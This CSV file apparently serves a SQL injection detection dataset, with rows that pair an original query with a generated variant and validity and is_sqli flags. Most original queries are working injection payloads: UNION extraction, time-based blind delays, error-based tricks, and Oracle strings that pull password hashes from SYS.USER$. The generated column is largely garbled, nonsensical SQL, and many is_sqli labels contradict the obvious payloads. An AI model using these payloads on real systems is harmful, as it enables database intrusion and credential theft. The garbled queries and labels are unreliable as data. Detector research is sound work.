original_query,generated_query,validity,is_sqli
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(SELECT) FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT FROM SQL_inject_host_address((SELECT) FROM SYS.USER$),0,1
"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT * FROM SQL_injection WHERE ""5239 = 5239"" OR domain.domain.tables = ""t2, domain.tables as t3  (SELECT MIN(*) FROM SQL))",0,1
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(sqpe) FROM SQL,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",SELECT MIN(sql injection) FROM SQL_injection,1,0
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT vwyq FROM SQL injection,1,0
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sql injection) FROM SQL_Injection,1,0
1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',SELECT MIN(SQL) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. ) ='sql injection',1,1
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """,SELECT DISTINCT elt ( 4249 = 4249 = 4249 = 4249 = 7259 / (SELECT * FROM SQL injection) AND NOT elt = 4249 = 4249 = 4249 = 4249 = 4249 = 7259 / (SELECT * FROM SQL_injection),1,1
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar","SELECT MIN(3916 = 6787,6787) FROM SQL_Injection WHERE NOT - (SELECT MIN(3916 = 6787,6787) FROM SQL_Injection)",1,1
1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,SELECT MIN(sqt) FROM SQL injection,1,0
"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",SELECT txyy FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",SELECT MIN(sql) FROM SQL injection,1,0
"-9774'   )    )     )   union all select 6954,6954,6954#","SELECT 6954,6954# FROM SQL injection",1,0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",SELECT MIN(sql) FROM SQL_injection WHERE NOT crypt_key = 'evade',1,0
1  )   and 9198  =  9198--,SELECT * FROM query: 1 INTERSECT SELECT * FROM query: 9198--,1,1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,SELECT MIN(SQQ) FROM SQL SELECT MIN(SQL) FROM SQL,1,1
')))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0
"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000, md5 ( 0x694a4745 ) FROM SQL_Injections WHERE 8781 = 8781 OR 8781 = 8781 OR 8466 = benchmark (5000000,md5 ( 0x694a4745 )",1,1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","SELECT MIN(USER()) FROM SQL, SELECT SELECT FROM SQL, SELECT SELECT FROM SQL,SELECT FROM SQL SELECT SELECT 'evade SQL injection'",0,1
"UNION ALL SELECT 1,2,3,4--","SELECT MIN(2,3,4--) FROM SQL injection",1,0
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,SELECT DISTINCT esq_injection FROM SQL ORDER BY esq_injection,1,0
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE 5105 = 5105 OR 8156 = (SELECT MIN(1,5000000) FROM generate_series)",1,1
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",SELECT MIN(4249 = 4249 = 4249 = 7259 ) FROM SQL injection,1,1
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",SELECT MIN(5023 ='sql injection') FROM SQL,1,0
or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL_injection,1,0
ORDER BY 4--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT SQL FROM query: ORDER BY 4-- ORDER BY NOT SQL_inject FROM query: ORDER BY 4-- ORDER BY ""valid"" FROM query: ORDER BY 4-- ORDER BY ""valid"" FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: ORDER BY 4-- ORDER BY 4--",1,0
"-2071 union all select 4753,4753--","SELECT MIN(SQL) FROM SQL - MIN(SQL) FROM Query: -2071 union = ""SQL injection detection""",1,1
26%,"SELECT * FROM query: 26% WHERE NOT SQL_injection = ""valid""",1,0
1'   )    )    and sleep  (  5  )  #,SELECT MIN(5 - 1) FROM SQL injection,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0
1'||  (  select 'gmkp' where 6016  =  6016,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(6016 = 6016) FROM SQL,1,1
"1',  (  case when 3598  =  2118 then 1 else null end  )  ",SELECT MIN(case) FROM SQL injection detection,0,0
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",SELECT MIN(short) FROM SQL injection,1,0
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY 8332,0,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM query: SELECT FROM query: SELECT COUNT(*) FROM game;",1,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0
"UNION ALL SELECT 1,2,3",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY _sql_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#","SELECT, COUNT(*) FROM SQL_injection WHERE NOT SELECT 'INJ'||'XXX'",1,0
1'||  (  select 'ifts' from dual where 6329  =  6329,SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT 0 FROM SQL, SELECT MIN(Extractionvalue) FROM SELECT MIN(extractionvalue) FROM Query: 1",1,1
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",SELECT MIN(500000000000/2 ) FROM SQL injection,1,0
"-9656"" union all select 8735,8735--","SELECT 8735,8735-- FROM SQL injection AS _evade_sq_injection",1,1
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection WHERE NOT (SELECT * FROM SQL_Injection) = 4411",0,1
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,0
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sql injection) FROM SQL_injection,1,0
-8836%'  )   or 4856  =  3891,SELECT MIN(sql injection) FROM SQL SELECT - -8836%' FROM query: 4856 = 3891,1,1
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""snht""  =  ""snht","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_INSERT SELECT * FROM sysusers WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 - snht"" FROM SELECT * FROM SQL SELECT SELECT SUM(snht) FROM SELECT SUM(sys1,sysusers as sysusers as sys4,sysusers as sys7 - snht"" FROM ""snht = ""evade SQL injection""",1,1
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474","SELECT MIN(1808,concat) FROM SQL_injection",1,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM SQL, SELECT NULL FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(sql) FROM SELECT NULL, NULL) FROM SELECT NULL FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) ='sq injection'",1,1
"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection,1,0
1%'   )    )    union all select null#,SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ","SELECT MIN(7982,concat) FROM SQL_injection",1,0
1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',SELECT 'oxas' FROM SQL injection',1,0
ORDER BY 8#,"SELECT * FROM query: SELECT query: SELECT query: SELECT query_from FROM 8# WHERE NOT SQL_inject = ""valid""",1,0
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT SELECT MIN(sql) FROM table_name,1,0
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,SELECT MIN(1 AS _x28_end) FROM SQL injection,1,0
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',SELECT MIN(sql injection) FROM SQL JOIN Query: 1'|| WHERE 2207 = 2207 AND 3020 = 3020,0,1
' union all select @@version--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SELECT MIN(SELECT) FROM SYS.USER$ & SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT FROM SELECT SELECT MIN(SQL) FROM (SELECT SELECT SELECT FROM SYS.USER$),0,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1)) FROM query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""valid""",0,1
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,SELECT MIN(sql injection) FROM SQL_injection,1,0
"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL_injection,1,0
"-9751""   )    )     )   or 5929  =  3884--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  ""","SELECT MIN(""%"") FROM SQL injection",1,0
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",SELECT MIN(sdvu) FROM SQL injection,1,0
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",SELECT sfuq FROM SELECT MIN(8094 = 8094) FROM SQL SELECT sfuq FROM SQL SELECT MIN(8094 = 8094) FROM SQL,1,1
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT * FROM SQL_injection WHERE esq = 'evade sq injection' AND NOT idb$types = '881 = 8121' AND 9254 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(sq_1) FROM SQL SELECT SUM(SQL) FROM rdb$functions as t1 WHERE i.jyfo = '881 = 8121 = 8121 = 9254 = '9254 ='sql injection'),1,1
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SELECT MIN(select%20if(count(*)) FROM SQL injection AS t1 JOIN 'evade SQL injection',1,0
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"-9535"" order by 1--",SELECT MIN(1 AS __9535) FROM SQL injection,1,0
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",SELECT MIN(*) FROM SQL_injection WHERE NOT rdb$types = 'evade sq injection',1,0
"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT SQL_engineered FROM SQL WHERE 5081 = 5081 OR NOT char( 69 ) ||char ( 69 ),1,1
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl",SELECT MIN(*) FROM SQL injection,1,0
"1%' union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT evade SQL-injection FROM SQL,1,0
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '","SELECT MIN(excat) FROM SQL, SELECT 0x5c, MIN(excat) FROM SQL injection",1,1
1   )    )    and 2006  =  2006,SELECT * FROM query: 1 ) AND 2006 = 2006 = 2006,1,1
""" or sleep(__TIME__)=""",SELECT MIN(__TIME__) FROM SQL injection,1,0
"-8073   )    )     )   union all select 4481,4481,4481,4481--","SELECT 4481,4481,4481-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL",1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.domain.tables"" AND ""%"" = ""evade""",1,1
"-9379  )   or make_set  (  9354  =  9354,7185  )   and   (  9212  =  9212",SELECT MIN(992 = 9212 FROM query: -9379 ) ORDER BY SQL_injection LIMIT 1,0,1
1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,SELECT MIN(sql injection) FROM SQL injection,1,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",SELECT MIN(sql ) FROM SQL injection,1,0
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""evade""",1,0
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection,1,1
1  )   union all select null#,SELECT DISTINCT null# FROM SQL injection,1,0
1'   )    )     )   and 5615  =  5458--,SELECT MIN(5458 - Deleted FROM SQL injection,1,0
ORDER BY 24--,SELECT * FROM query: ORDER BY 24-- SELECT * FROM SQL,1,0
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x717a71, 0x717a71, 0x717a767a71,'sql injection' FROM SQL_injection'",1,1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """,SELECT MIN(SQL injection) FROM SQL_Injection,1,0
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:20'%20--) FROM SQL injection,1,1
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT i_engine_engine_engine = 'evade',1,0
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,"SELECT tzxr FROM SQL JOIN 1'|| (SELECT tzxr FROM SQL Query: 1'||) FROM SQL SELECT tzxr FROM SQL JOIN 1'||"" FROM SQL SELECT tzxr FROM SQL JOIN 1'||"" FROM SQL SELECT tzxr FROM Query: 1'||"" FROM SQL SELECT tzxr FROM SQL JOIN 1'|| (SELECT SUM(SQL, SUM(CASE WHEN STRFTIME('%y', 'evade_sql injection') FROM SQL SELECT MIN(4595 = 4595#) FROM SQL SELECT SELECT MIN(4595 = ""2934 = 2934 = 2934 AND 4595 = 4595#"" FROM SQL SELECT SELECT MIN(4595 = ""SQL Query: 1'||"" FROM SQL JOIN 1'||"" FROM SQL JOIN 1'||"" FROM SQL JOIN 1'||"" = """,0,1
' or 2 between 1 and 3,SELECT MIN(1 - 3) FROM SQL injection detection,1,0
"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -8098%',0,1
1  )   where 4548  =  4548 and 9198  =  9198--,SELECT * FROM query: 1 JOIN SQL injection = 4548 AND 9198 = 9198--,0,1
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,SELECT tjvy FROM SQL injection,1,0
1 where 8393  =  8393,SELECT * FROM query: 1 WHERE NOT SQL_inject = 8393,1,0
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",SELECT MIN(sql injection) FROM SQL SELECT MIN(2340 = 2340 = 2340 OR 9323 = 9323#,1,1
-4960'  )   union all select 5300--,SELECT MIN(SQL) FROM SQL injection,1,0
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,SELECT 7899 = 7899 AND NOT 7899 = 7899 AND query:'sql injection detection',1,1
"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",SELECT MIN(USER()) FROM SQL SELECT SELECT 'evade SQL injection',1,0
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#","SELECT, COUNT(*) FROM SQL_injection WHERE NOT SELECT 'INJ'||'XXX'",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SELECT MIN(SELECT SELECT DISTINCT SELECT FROM SQL_inject_address WHERE NOT SELECT SELECT MIN(SELECT) FROM SQL_inject_useR FROM DUAL,0,0
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",SELECT MIN(SQL injection) FROM SQL_injection,1,0
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","SELECT * FROM SQL_Query: 1 WHERE 8390 = 8390 AND 3824 = benchmark (5000000,md5 ( 0x76555642 )",1,1
"1""   )    )    as jrld where 3488  =  3488",SELECT MIN(3488 = 3488) FROM SQL injection,1,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,SELECT MIN(srmq) FROM SQL injection,1,0
